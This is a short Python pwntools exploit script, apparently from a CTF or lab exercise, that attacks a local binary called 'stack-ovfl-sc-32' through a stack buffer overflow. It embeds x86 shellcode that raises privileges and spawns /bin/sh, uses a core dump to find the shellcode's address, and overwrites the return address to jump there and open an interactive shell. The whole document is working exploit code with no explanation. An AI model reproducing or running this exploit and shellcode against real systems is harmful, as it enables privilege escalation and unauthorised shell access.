from pwn import *

SHELLCODE ='\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

ARG1 = ''
ENV = {}

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE

p = process(["stack-ovfl-sc-32", ARG1], env=ENV)

# Send shellcode,  cause a crash, find it.
p.send(SHELLCODE + 'a' * (4-len(SHELLCODE)%4) + "aaaa" * 500)
p.wait()
c = Core('./core')
addr_shellcode = c.stack.find(SHELLCODE)

# Attack by jumping to shellcode!
p = process(["stack-ovfl-sc-32", ARG1], env=ENV)
p.send(SHELLCODE + 'a' * (4-len(SHELLCODE)%4) + p32(addr_shellcode) * 100)
p.interactive()
